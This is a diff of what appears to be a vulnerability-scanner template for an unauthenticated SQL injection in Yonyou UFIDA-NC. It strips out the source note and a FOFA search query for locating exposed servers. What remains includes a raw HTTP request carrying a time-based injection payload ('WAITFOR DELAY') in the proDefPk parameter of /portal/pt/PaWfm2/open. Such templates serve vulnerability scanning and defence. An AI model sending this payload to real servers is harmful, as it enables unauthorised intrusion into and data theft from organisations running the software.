@@ -3,12 +3,8 @@ info:
   name: 用友-UFIDA-NC open存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zd2c3aruh6epf2g9'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zd2c3aruh6epf2g9
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'GET /portal/pt/PaWfm2/open?pageId=login&proDefPk=1%27WAITFOR%20DELAY%20%270%3a0%3a5%27-- HTTP/1.1
